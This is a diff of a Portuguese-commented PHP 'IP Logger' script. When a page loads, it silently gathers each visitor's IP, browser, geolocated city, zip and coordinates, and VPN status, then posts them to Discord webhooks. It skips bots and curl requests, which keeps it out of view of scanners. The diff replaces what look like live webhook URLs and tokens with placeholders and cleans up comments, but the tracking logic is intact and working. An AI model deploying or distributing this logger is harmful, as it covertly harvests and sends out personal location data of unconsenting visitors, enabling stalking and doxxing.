@@ -6,12 +6,12 @@ if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
     exit();
 }
 
-//VOCÊ PODE DEFINIR SEU FUSO HORÁRIO AQUI!
+// Você pode definir seu fuso horário aqui!. (Horário padrão de São Paulo - SP)
 date_default_timezone_set("America/Sao_Paulo");
 $Date = date('d/m/Y');
 $Time = date('G:i:s');
 
-//Verifica se o IP é uma VPN (nem sempre está correto!)
+// Verifica se o IP é uma VPN (nem sempre está correto!)
 $Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
 $VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
 if ($VPNConn->connection_type === "Corporate") {
@@ -20,7 +20,7 @@ if ($VPNConn->connection_type === "Corporate") {
     $VPN = "No";
 }
 
-//Configura algumas variáveis
+// Configura algumas variáveis
 $Country = $Details->country;
 $CountryCode = $Details->countryCode;
 $Region = $Details->regionName;
@@ -32,27 +32,31 @@ $WebhookName = $IP;
 
 class Discord
 {
-    //Isso será executado e enviado assim que a página carregar
+    // Isso será executado e enviado assim que a página carregar
     public function Visitor()
     {
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
-        // Array de URLs de webhooks
+        // Array de URLs de webhooks (Você pode adicionar quantos webhooks quiser, siga o exemplo abaixo)
         $Webhooks = array(
-            "https://discord.com/api/webhooks/1145109094827556905/v-m6kQqbWn7A36yIe7qocBa0ql8o4WostuoSsPdH9_XDmSjxkSpAzhsUwfhAevP-EiA_",
-            "https://discord.com/api/webhooks/1145109118357602315/Opap63k7ICE3xTeOMJohtdy04JObL4mVCI7YUSexrQHhIw7VWKUWLn6E9sk3vq-MFfko",
-            "https://discord.com/api/webhooks/1145110436354728037/J0MOawjzgtltU9mimeoW1v2OMKPpJM5Ch_ZU_PPpyoz3b2rbf3SkvITh5FljvX_-3CpU",
-            "https://discord.com/api/webhooks/1145110465333170276/ZrE0Op9PO-3q8yhxVTCYI-eYeKjxs1rq23pyj3bN78HYcVVVkx-Rrl4f2-bQK-PZQbmR",
+            "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+            
+        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
+
         );
 
         $InfoArr = array(
-            "username" => "$WebhookName", //Nome do Webhook
-            "avatar_url" => "https://media.discordapp.net/attachments/1111530895069949952/1111550532688031744/50077294.jpg", //Avatar do Webhook
+            "username" => "$WebhookName", // Nome do Webhook
+            "avatar_url" => "https://media.discordapp.net/attachments/1111530895069949952/1111550532688031744/50077294.jpg", // Avatar do Webhook
             "embeds" => [array(
 
-                "title" => "IP Logger", //Titulo da embed
-                "url" => "https://github.com/zyrox68/IP-Logger", //Link do titulo da embed (opcional)
-                "color" => "39423", //Cor do Webhook (Usar codigo hexadecimal)
+                "title" => "IP Logger", // Titulo da embed
+                "url" => "https://github.com/zyrox68/IP-Logger", // Link do titulo da embed (opcional)
+                "color" => "39423", // Cor do Webhook (Usar codigo hexadecimal)
 
                 "fields" => [array(
                     "name" => "<:wifi:1128156254741745725> IP",
@@ -82,7 +86,7 @@ class Discord
                     "text" => "🕗 $Date $Time",
                 ),
                 "thumbnail" => array(
-                    "url" => "https://media.discordapp.net/attachments/1111530895069949952/1111552182345543740/1448184200057.png"//Thumbnail da embed
+                    "url" => "https://media.discordapp.net/attachments/1111530895069949952/1111552182345543740/1448184200057.png"// Thumbnail da embed
                 ),
             )],
         );
@@ -106,6 +110,5 @@ class Discord
     }
 }
 
-// Instanciar a classe Discord
 $discord = new Discord();
 ?>
